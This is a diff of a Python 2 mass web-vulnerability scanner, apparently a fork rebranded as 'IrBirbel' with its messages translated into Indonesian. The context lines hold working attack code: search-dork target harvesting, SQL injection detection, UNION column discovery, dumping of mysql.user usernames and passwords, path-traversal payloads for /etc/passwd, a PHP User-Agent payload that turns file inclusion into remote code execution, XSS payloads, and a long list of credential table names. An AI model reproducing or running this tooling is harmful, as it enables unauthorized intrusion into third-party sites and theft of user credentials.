@@ -74,6 +74,8 @@ def logo():
  	print "|########################################################################################|\n"
 	print W
 
+                
+                
 if sys.platform == 'linux' or sys.platform == 'linux2':
   subprocess.call("clear", shell=True)
   logo()
@@ -82,13 +84,13 @@ else:
   subprocess.call("cls", shell=True)
   logo()
   
-log = "Tn.IrBirbel ID-sqli.txt"
+log = "IrBirbel ID-sqli.txt"
 logfile = open(log, "a")
-lfi_log = "Tn.IrBirbel ID-lfi.txt"
+lfi_log = "IrBirbel ID-lfi.txt"
 lfi_log_file = open(lfi_log, "a")
-rce_log = "Tn.IrBirbel ID-rce.txt"
+rce_log = "IrBirbel ID-rce.txt"
 rce_log_file = open(rce_log, "a")
-xss_log = "Tn.IrBirbel ID-xss.txt"
+xss_log = "IrBirbel ID-xss.txt"
 xss_log_file = open(xss_log, "a")
 
 arg_end = "--"
@@ -108,7 +110,7 @@ socket.setdefaulttimeout(timeout)
            
 lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]
 
-xsses = ["<h1>XSS by baltazar</h1>","%3Ch1%3EXSS%20by%20baltazar%3C/h1%3E","PGgxPlhTUyBieSBOb3ZhQ3lnbmk8L2gxPg==","%3C%68%31%3E%58%53%53%20%62%79%20%4E%6F%76%61%43%79%67%6E%69%3C%2F%68%31%3E","&#x3C;&#x68;&#x31;&#x3E;&#x58;&#x53;&#x53;&#x20;&#x62;&#x79;&#x20;&#x4E;&#x6F;&#x76;&#x61;&#x43;&#x79;&#x67;&#x6E;&#x69;&#x3C;&#x2F;&#x68;&#x31;&#x3E;","<IMG SRC=JaVaScRiPt:alert('XSS by NovaCygni')>","<IMG SRC=`javascript:alert('XSS By NovaCygni')`>"]
+xsses = ["<h1>XSS by IrBirbel</h1>","%3Ch1%3EXSS%20by%20baltazar%3C/h1%3E","PGgxPlhTUyBieSBOb3ZhQ3lnbmk8L2gxPg==","%3C%68%31%3E%58%53%53%20%62%79%20%4E%6F%76%61%43%79%67%6E%69%3C%2F%68%31%3E","&#x3C;&#x68;&#x31;&#x3E;&#x58;&#x53;&#x53;&#x20;&#x62;&#x79;&#x20;&#x4E;&#x6F;&#x76;&#x61;&#x43;&#x79;&#x67;&#x6E;&#x69;&#x3C;&#x2F;&#x68;&#x31;&#x3E;","<IMG SRC=JaVaScRiPt:alert('XSS by IrBirbel')>","<IMG SRC=`javascript:alert('XSS By IrBirbel')`>"]
 
 tables = ['user','users','tbladmins','Logins','logins','login','admins','members','member', '_wfspro_admin', '4images_users', 'a_admin', 'account', 'accounts', 'adm', 'admin', 'admin_login', 'admin_user', 'admin_userinfo', 'administer', 'administrable', 'administrate', 'administration', 'administrator', 'administrators', 'adminrights', 'admins', 'adminuser','adminusers','article_admin', 'articles', 'artikel','author', 'autore', 'backend', 'backend_users', 'backenduser', 'bbs', 'book', 'chat_config', 'chat_messages', 'chat_users', 'client', 'clients', 'clubconfig', 'company', 'config', 'contact', 'contacts', 'content', 'control', 'cpg_config', 'cpg132_users', 'customer', 'customers', 'customers_basket', 'dbadmins', 'dealer', 'dealers', 'diary', 'download', 'Dragon_users', 'e107.e107_user', 'e107_user', 'forum.ibf_members', 'fusion_user_groups', 'fusion_users', 'group', 'groups', 'ibf_admin_sessions', 'ibf_conf_settings', 'ibf_members', 'ibf_members_converge', 'ibf_sessions', 'icq', 'index', 'info', 'ipb.ibf_members', 'ipb_sessions', 'joomla_users', 'jos_blastchatc_users', 'jos_comprofiler_members', 'jos_contact_details', 'jos_joomblog_users', 'jos_messages_cfg', 'jos_moschat_users', 'jos_users', 'knews_lostpass', 'korisnici', 'kpro_adminlogs', 'kpro_user', 'links', 'login_admin', 'login_admins', 'login_user', 'login_users','logon', 'logs', 'lost_pass', 'lost_passwords', 'lostpass', 'lostpasswords', 'm_admin', 'main', 'mambo_session', 'mambo_users', 'manage', 'manager', 'mb_users','memberlist','minibbtable_users', 'mitglieder', 'mybb_users', 'mysql', 'name', 'names', 'news', 'news_lostpass', 'newsletter', 'nuke_users', 'obb_profiles', 'order', 'orders', 'parol', 'partner', 'partners', 'passes', 'password', 'passwords', 'perdorues', 'perdoruesit', 'phorum_session', 'phorum_user', 'phorum_users', 'phpads_clients', 'phpads_config', 'phpbb_users', 'phpBB2.forum_users', 'phpBB2.phpbb_users', 'phpmyadmin.pma_table_info', 'pma_table_info', 'poll_user', 'punbb_users', 'pwd', 'pwds', 'reg_user', 'reg_users', 'registered', 'reguser', 'regusers', 'session', 'sessions', 'settings', 'shop.cards', 'shop.orders', 'site_login', 'site_logins', 'sitelogin', 'sitelogins', 'sites', 'smallnuke_members', 'smf_members', 'SS_orders', 'statistics', 'superuser', 'sysadmin', 'sysadmins', 'system', 'sysuser', 'sysusers', 'table', 'tables', 'tb_admin', 'tb_administrator', 'tb_login', 'tb_member', 'tb_members', 'tb_user', 'tb_username', 'tb_usernames', 'tb_users', 'tbl', 'tbl_user', 'tbl_users', 'tbluser', 'tbl_clients', 'tbl_client', 'tblclients', 'tblclient', 'test', 'usebb_members','user_admin', 'user_info', 'user_list', 'user_login', 'user_logins', 'user_names', 'usercontrol', 'userinfo', 'userlist', 'userlogins', 'username', 'usernames', 'userrights','vb_user', 'vbulletin_session', 'vbulletin_user', 'voodoo_members', 'webadmin', 'webadmins', 'webmaster', 'webmasters', 'webuser', 'webusers','wp_users', 'x_admin', 'xar_roles', 'xoops_bannerclient', 'xoops_users', 'yabb_settings', 'yabbse_settings', 'Category', 'CategoryGroup', 'ChicksPass', 'dtproperties', 'JamPass', 'News', 'Passwords by usage count', 'PerfPassword', 'PerfPasswordAllSelected','pristup', 'SubCategory', 'tblRestrictedPasswords', 'Ticket System Acc Numbers', 'Total Members', 'UserPreferences', 'tblConfigs', 'tblLogBookAuthor', 'tblLogBookUser', 'tblMails', 'tblOrders', 'tblUser', 'cms_user', 'cms_users', 'cms_admin', 'cms_admins', 'user_name', 'jos_user', 'table_user', 'email', 'mail', 'bulletin', 'login_name', 'admuserinfo', 'userlistuser_list', 'SiteLogin', 'Site_Login', 'UserAdmin']
 
@@ -258,7 +260,7 @@ def search(maxc):
       except(KeyboardInterrupt):
         pass
     tmplist = []
-    print "\n\n[+] URLS (unsorted): ",len(urls)
+    print "\n\n[+] URLS (Tidak Dibedakan): ",len(urls)
     for url in urls:
       try:
         host = url.split("/",3)
@@ -269,7 +271,7 @@ def search(maxc):
 	
       except:
         pass
-    print "[+] URLS (sorted)  : ",len(finallist)
+    print "[+] URLS (Dibedakan)  : ",len(finallist)
     return finallist
 
   
@@ -347,7 +349,7 @@ def ClassicINJ(url):
                 source = urllib2.urlopen(host).read()
                 for type,eMSG in sqlerrors.items():
                         if re.search(eMSG, source):
-                                print R+"[!] w00t!,w00t!:", O+host, B+"Error:", type,R+" ---> SQL Injection Found"
+                                print R+"root=>IrBirbel", O+host, B+"Error:", type,R+" ---> SQL Injection Ditemukan"
 				logfile.write("\n"+host)
 				vuln.append(host)
                                 col.append(host)
@@ -368,19 +370,19 @@ def ClassicLFI(url):
     try:
       check = urllib2.urlopen(lfiurl+lfi.replace("\n", "")).read()
       if re.findall("root:x", check):
-	print R+"[!] w00t!,w00t!: ", O+lfiurl+lfi,R+" ---> Local File Include Found"
+	print R+"root=>IrBirbel ", O+lfiurl+lfi,R+" ---> Local File Include Found"
 	lfi_log_file.write("\n"+lfiurl+lfi)
 	vuln.append(lfiurl+lfi)
 	target = lfiurl+lfi
 	target = target.replace("/etc/passwd","/proc/self/environ")
-	header = "<? echo md5(baltazar); ?>"
+	header = "<? echo md5(IrBirbel); ?>"
         try:
 	  request_web = urllib2.Request(target)
 	  request_web.add_header('User-Agent', header)
 	  text = urllib2.urlopen(request_web)
 	  text = text.read()
 	  if re.findall("f17f4b3e8e709cd3c89a6dbd949d7171", text):
-	    print R+"[!] w00t!,w00t!: ",O+target,R+" ---> LFI to RCE Found"
+	    print R+"root=>IrBirbel ",O+target,R+" ---> LFI to RCE Found"
 	    rce_log_file.write("\n",target)
 	    vuln.append(target)
         except:
@@ -393,17 +395,17 @@ def ClassicXSS(url):
   for xss in xsses:
     try:
       source = urllib2.urlopen(url+xss.replace("\n","")).read()
-      if re.findall("XSS by baltazar", source) or re.findall("XSS by NovaCygni", source):
-          print R+"[!] w00t!,w00t!: ", O+url+xss,R+" ---> XSS Found (might be false)"
+      if re.findall("XSS by IrBirbel", source) or re.findall("XSS by IrBirbel", source):
+          print R+"root=>IrBirbel ", O+url+xss,R+" ---> XSS Found (Mungkin Salah)"
 	  xss_log_file.write("\n"+url+xss)
 	  vuln.append(url+xss)
     except:
       pass
 
 def injtest():
-  print B+"\n[+] Preparing for SQLi scanning ..."
-  print "[+] Can take a while ..."
-  print "[!] Working ...\n"
+  print B+"\n[+] Sedang di Scan..."
+  print "[+] Tunggu Sampai Selesai ..."
+  print "[!] Berhasil ...\n"
   i = len(usearch) / int(numthreads)
   m = len(usearch) % int(numthreads)
   z = 0
@@ -420,9 +422,9 @@ def injtest():
       thread.join()
       
 def lfitest():
-  print B+"\n[+] Preparing for LFI - RCE scanning ..."
-  print "[+] Can take a while ..."
-  print "[!] Working ...\n"
+  print B+"\n[+] Sedang Scan LFI - RCE ..."
+  print "[+] Tunggu Sampai Selesai ..."
+  print "[!] Berhasil ...\n"
   i = len(usearch) / int(numthreads)
   m = len(usearch) % int(numthreads)
   z = 0
@@ -439,9 +441,9 @@ def lfitest():
       thread.join()
 
 def xsstest():
-  print B+"\n[+] Preparing for XSS scanning ..."
-  print "[+] Can take a while ..."
-  print "[!] Working ...\n"
+  print B+"\n[+] Sedang Scan XSS ..."
+  print "[+] Tunggu Sampai Selesai ..."
+  print "[!] Berhasil ...\n"
   i = len(usearch) / int(numthreads)
   m = len(usearch) % int(numthreads)
   z = 0
@@ -469,12 +471,12 @@ while menu == True:
     darkurl = []
 
     print W
-    sites = raw_input("\nTarget Lu Taik(domain)   : ")
+    sites = raw_input("\nTarget Domain : ")
     sitearray = [ sites ]
 
     go = []
 
-    dorks = raw_input("Choose the number of random dorks (0 for all.. may take awhile!)   : "); print ""
+    dorks = raw_input("Banyak Dork ( Random Nomor BosQ : "); print ""
     if int(dorks) == 0:
       i = 0
       while i < len(d0rk):
@@ -491,49 +493,49 @@ while menu == True:
 
 
 
-    numthreads = raw_input('\nEnter no. of threads : ')
-    maxc = raw_input('Enter no. of pages   : ')
-    print "\nNumber of SQL errors :",len(sqlerrors)
-    print "Number of LFI paths  :",len(lfis)
-    print "Number of XSS cheats :",len(xsses)
-    print "Number of headers    :",len(header)
-    print "Number of threads    :",numthreads
-    print "Number of dorks      :",len(go)
-    print "Number of pages      :",maxc
-    print "Timeout in seconds   :",timeout
+    numthreads = raw_input('\nEnter no. Threads : ')
+    maxc = raw_input('Enter no. Pages   : ')
+    print "\nNomer  SQL errors :",len(sqlerrors)
+    print "Nomer  LFI paths  :",len(lfis)
+    print "Nomer  XSS cheats :",len(xsses)
+    print "Nomer  Headers    :",len(header)
+    print "Nomer  Threads    :",numthreads
+    print "Nomer  Dorks      :",len(go)
+    print "Nomer  Pages      :",maxc
+    print "Waktu Habis   :",timeout
     print ""
 
     usearch = search(maxc)
     new = 0
 
 
-  print R+"\n[1] SQLi Testing"
-  print "[2] SQLi Testing Auto Mode"
-  print "[3] LFI - RCE Testing"
-  print "[4] XSS Testing"
-  print "[5] SQLi and LFI - RCE Testing"
-  print "[6] SQLi and XSS Testing"
-  print "[7] LFI -RCE and XSS Testing"
-  print "[8] SQLi,LFI - RCE and XSS Testing"
-  print "[9] Save valid urls to file"
-  print "[10] Print valid urls"
-  print "[11] Found vuln in last scan"
-  print "[12] New scan"
-  print "[0] Exit\n"
+  print R+"\n[1] SQLi Test"
+  print "[2]  SQLi Mode Auto Test"
+  print "[3]  LFI - RCE Test"
+  print "[4]  XSS Test"
+  print "[5]  SQLi and LFI - RCE Test"
+  print "[6]  SQLi and XSS Test"
+  print "[7]  LFI -RCE and XSS Test"
+  print "[8]  SQLi,LFI - RCE and XSS Test"
+  print "[9]  Save Hasil ke File"
+  print "[10] Print Hasil"
+  print "[11] Ditemukan Vuln Pada scan Akhir"
+  print "[12] Scan Baru"
+  print "[0]  Keluar\n"
   chce = raw_input(":")
   if chce == '1':
     injtest()
     
   if chce == '2':
     injtest()
-    print B+"\n[+] Preparing for Column Finder ..."
-    print "[+] Can take a while ..."
-    print "[!] Working ..."
-    # Thanks rsauron for schemafuzz
+    print B+"\n[+] Sedang Scan Column Finder ..."
+    print "[+] Tunggu Sampai Selesai ..."
+    print "[!] Berhasil ..."
+    # root==>IrBirbel
     for host in col:
       print R+"\n[+] Target: ", O+host
-      print R+"[+] Attempting to find the number of columns ..."
-      print "[+] Testing: ",
+      print R+"[+] Mencoba Menemukan Column ..."
+      print "[+] Test: ",
       checkfor = []
       host = host.rsplit("'", 1)[0]
       sitenew = host+arg_eva+"and"+arg_eva+"1=2"+arg_eva+"union"+arg_eva+"all"+arg_eva+"select"+arg_eva
@@ -553,9 +555,9 @@ while menu == True:
 	  for y in checkfor:
 	    colFound = re.findall(y, source)
 	    if len(colFound) >= 1:
-	      print "\n[+] Column length is:", len(checkfor)
+	      print "\n[+] Panjang Column:", len(checkfor)
 	      nullcol = re.findall(("\d+"), y)
-	      print "[+] Found null column at column #:", nullcol[0]
+	      print "[+] Kolam Yang di Temukan Kosong #:", nullcol[0]
 	      for z in xrange(0, len(checkfor)):
 		if z > 0:
 		  makepretty += ","
@@ -568,7 +570,7 @@ while menu == True:
 	      print "[+] darkc0de URL:", site
 	      darkurl.append(site)
 	      
-	      print "[-] Done!\n"
+	      print "[-] Selesai!\n"
 	      break
 	      
 	except(KeyboardInterrupt, SystemExit):
@@ -576,10 +578,10 @@ while menu == True:
 	except:
 	  pass
       
-      print "\n[!] Sorry column length could not be found\n"
+      print "\n[!] Panjang Kolam Tidak Dapat Ditemukan\n"
       ###########
       
-    print B+"\n[+] Gathering MySQL Server Configuration..."
+    print B+"\n[+] Mengumpulkan Konfigurasi Server MySQL..."
     for site in darkurl:
       head_URL = site.replace("darkc0de", "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)")+arg_end
       print R+"\n[+] Target:", O+site
@@ -605,16 +607,16 @@ while menu == True:
 	      source = urllib2.urlopen(load).read()
 	      search = re.findall("baltazar", source)
 	      if len(search) > 0:
-		print "\n[!] w00t!w00t!: "+site.replace("darkc0de", "load_file(0x"+file.encode("hex")+")")
+		print "\nroot==>IrBirbel: "+site.replace("darkc0de", "load_file(0x"+file.encode("hex")+")")
 		
 	      load = site.replace("dakrc0de", "concat_ws(char(58),user,password,0x62616c74617a6172)")+arg_eva+"from"+arg_eva+"mysql.user"
 	    source = urllib2.urlopen(load).read()
 	    if re.findall("baltazar", source):
-	      print "\n[!] w00t!w00t!: "+site.replace("darkc0de", "concat_ws(char(58),user,password)")+arg_eva+"from"+arg_eva+"mysql.user"
+	      print "\nroot==>IrBirbel: "+site.replace("darkc0de", "concat_ws(char(58),user,password)")+arg_eva+"from"+arg_eva+"mysql.user"
 	  
-	  print W+"\n[+] Number of tables:",len(tables)
-	  print "[+] Number of columns:",len(columns)
-          print "[+] Checking for tables and columns..."
+	  print W+"\n[+] Nomor table:",len(tables)
+	  print "[+] Nomor column:",len(columns)
+          print "[+] Sedang Periksa Table dan Column..."
           target = site.replace("darkc0de", "0x62616c74617a6172")+arg_eva+"from"+arg_eva+"T"
 	  for table in tables:
             try:
@@ -622,26 +624,26 @@ while menu == True:
 	      source = urllib2.urlopen(target_table).read()
 	      search = re.findall("baltazar", source)
 	      if len(search) > 0:
-		print "\n[!] w00t!w00t! Found a table called: < "+table+" >"
-		print "\n[+] Lets check for columns inside table < "+table+" >"
+		print "\n[!] root==>IrBirbel Table Ketemu: < "+table+" >"
+		print "\n[+] Periksa Column di Dalam Table < "+table+" >"
 		for column in columns:
 		  try:
 		    source = urllib2.urlopen(target_table.replace("0x62616c74617a6172", "concat_ws(char(58),0x62616c74617a6172,"+column+")")).read()
 		    search = re.findall("baltazar", source)
 		    if len(search) > 0:
-		      print "\t[!] w00t!w00t! Found a column called: < "+column+" >"
+		      print "\t[!] root==>IrBirbel Column Ketemu: < "+column+" >"
 		  except(KeyboardInterrupt, SystemExit):
 		    raise
 		  except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
 		    pass
 	    
-		print "\n[-] Done searching inside table < "+table+" > for columns!"
+		print "\n[-] Selesai Mencari di Dalam Table < "+table+" > for columns!"
 	  
 	    except(KeyboardInterrupt, SystemExit):
 	      raise
 	    except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
 	      pass
-	  print "[!] Fuzzing is finished!"
+	  print "[!] TERIMA KASIH!"
 	  break	  
 	except(KeyboardInterrupt, SystemExit):
 	  raise
@@ -673,17 +675,17 @@ while menu == True:
     xsstest()
     
   if chce == '9':
-    print B+"\nSaving valid urls ("+str(len(finallist))+") to file"
+    print B+"\nSave Hasil  ("+str(len(finallist))+") ke File"
     listname = raw_input("Filename: ")
     list_name = open(listname, "w")
     finallist.sort()
     for t in finallist:
       list_name.write(t+"\n")
     list_name.close()
-    print "Urls saved, please check", listname
+    print "Urls d Save, Silahkan cek", listname
    
   if chce == '10':
-    print W+"\nPrinting valid urls:\n"
+    print W+"\nPrint Hasil:\n"
     finallist.sort()
     for t in finallist:
       print B+t
@@ -696,7 +698,7 @@ while menu == True:
     print W+""
 
   if chce == '0':
-    print R+"\n[-] Exiting ..."
+    print R+"\n[-] Keluar ..."
     mnu = False
     print W
 sys.exit(1)
